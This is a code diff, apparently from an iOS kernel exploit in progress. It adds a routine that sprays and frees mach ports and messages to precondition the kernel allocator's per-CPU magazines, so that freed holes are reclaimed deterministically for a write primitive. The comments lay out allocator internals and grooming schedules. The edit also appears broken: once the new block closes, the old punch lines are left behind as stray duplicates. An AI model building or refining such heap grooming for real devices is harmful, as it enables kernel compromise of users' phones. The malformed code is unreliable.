@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v12-measurevolley"
+#define P088_BUILD @"p088-write-hop-v13-magpreload"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -444,6 +444,30 @@ static void p088_punch(mach_port_t port) {
     mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
     mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)sizeof(rbuf),
              port, 0, MACH_PORT_NULL);
+}
+
+/* v13 magazine pre-conditioning (venice handoff §magazine state: the zone
+   magazine is 8 slots / half / CPU, LIFO, free-half swaps into the alloc
+   half at capacity; data.kalloc shares the same machinery + insert path
+   0x9e80b1c). The v10-v12 boots' fills landed wherever leftover magazine
+   / freelist depth put them (0 D2-hit boots + the sentPre/sentPost edge
+   landings). Prefill the free half to depth-6 ON THE TAP THREAD (same CPU
+   as the punches AND A's prewire; A14 THREAD_AFFINITY is a hint only so
+   everything stays on one thread), then the round's 2 punches complete
+   the half -> swap -> A's pop = the last-punched hole, DETERMINISTIC. */
+static void p088_mag_prefill(uint32_t cycles) {
+    for (uint32_t i = 0; i < cycles; i++) {
+        mach_port_t p = p088_make_port();
+        if (p == MACH_PORT_NULL) return;
+        if (p088_send_simple(p, 0x4D00u | (i & 0xFFu))) {
+            uint8_t rbuf[P088_MSG_SIZE + 64];
+            memset(rbuf, 0, sizeof(rbuf));
+            mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
+            mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
+                     (mach_msg_size_t)sizeof(rbuf), p, 0, MACH_PORT_NULL);
+        }
+        mach_port_destroy(mach_task_self(), p);
+    }
 }
 
 /* v6 refill heal: resend a fresh kmsg into an emptied port. New kmsgs
@@ -953,6 +977,9 @@ static NSString *p088_yfmt(double y) {
                  r, conv ? "CONV" : "MEASURE", nFires, stepMs, baseMs, lastATms);
 
         /* --- v7 punch schedule ---
+           v13: prefill 6 same-CPU magazine frees FIRST so the round's two
+           punches complete the free half (capacity 8/half/CPU) and the
+           swap fires: A's pop = K_h deterministically (not freelist-luck).
            MEASURE rounds: PAIR punch (h+1) then (h). Freelist becomes
              [K_h(top), K_{h+1}] -> A pops queue=K_h, record=K_{h+1}; the
              spill lands at K_{h+1}+0xC00. A content-verified D2 hit at
@@ -971,12 +998,22 @@ static NSString *p088_yfmt(double y) {
         if (sac >= nRun) sac = P088_RUN_A0;
         int punched[2] = { -1, -1 };   /* [0]=queue hole, [1]=witness (volley) */
         if (conv) {
+            p088_mag_prefill(5);   /* v13: 5 + sac(1) = 6... keep depth headroom:
+                                      punch the pair on the NEXT prefill boundary */
             p088_punch(run[sac].port); run[sac].alive = NO;
             punched[0] = (int)sac;
             p088_log(@"  run %u live; conv queue hole = run[%u] (sac); "
                      @"record pop = previous round's last-released chunk",
                      nRun - 1, punched[0]);
         } else {
+            p088_mag_prefill(6);   /* v13: +2 pair punches = capacity 8 -> swap */
+            p088_punch(run[h + 1].port); run[h + 1].alive = NO;
+            p088_punch(run[h].port);     run[h].alive = NO;
+            punched[0] = (int)h;
+            p088_log(@"  run %u live; prefill=6 + PAIR punched run[%u] then run[%u] -> "
+                     @"mag swap; A pops queue=K_%u, record=K_%u (spill=K_%u+0xC00) DET'd",
+                     nRun - 2, h + 1, h, h, h + 1, h + 1);
+        }
             p088_punch(run[h + 1].port); run[h + 1].alive = NO;
             p088_punch(run[h].port);     run[h].alive = NO;
             punched[0] = (int)h;
